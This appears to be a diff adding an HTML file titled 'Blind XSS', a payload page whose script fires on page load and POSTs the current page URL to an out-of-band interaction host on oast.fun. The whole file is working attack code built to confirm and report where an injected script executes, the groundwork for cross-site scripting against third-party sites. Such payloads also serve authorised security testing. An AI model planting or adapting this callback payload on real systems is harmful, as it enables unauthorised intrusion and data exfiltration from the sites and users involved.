@@ -1,0 +1,46 @@
+<html>
+    <head>
+        <title>Blind XSS</title>
+        <script>
+            // Function to send the current page's URL to target.com
+            function sendToTarget() {
+                var currentPageUrl = window.location.href; // Get the current page's URL
+                var targetUrl = 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/receive'; // Replace with the actual URL where you want to send the data
+    
+                // Create a new XMLHttpRequest object
+                var xhr = new XMLHttpRequest();
+    
+                // Open a POST request to the target URL
+                xhr.open('POST', targetUrl, true);
+    
+                // Set the Content-Type header
+                xhr.setRequestHeader('Content-Type', 'application/json');
+    
+                // Define what happens on successful data submission
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        console.log('Data sent successfully.');
+                    } else {
+                        console.log('Data submission failed. Status: ' + xhr.status);
+                    }
+                };
+    
+                // Define what happens in case of error
+                xhr.onerror = function() {
+                    console.log('Request failed');
+                };
+    
+                // Send the current page's URL as JSON data
+                xhr.send(JSON.stringify({ url: currentPageUrl }));
+            }
+    
+            // Call the function when the page loads
+            window.onload = function() {
+                sendToTarget();
+            };
+        </script>
+    </head>
+    <body>
+
+    </body>
+</html>
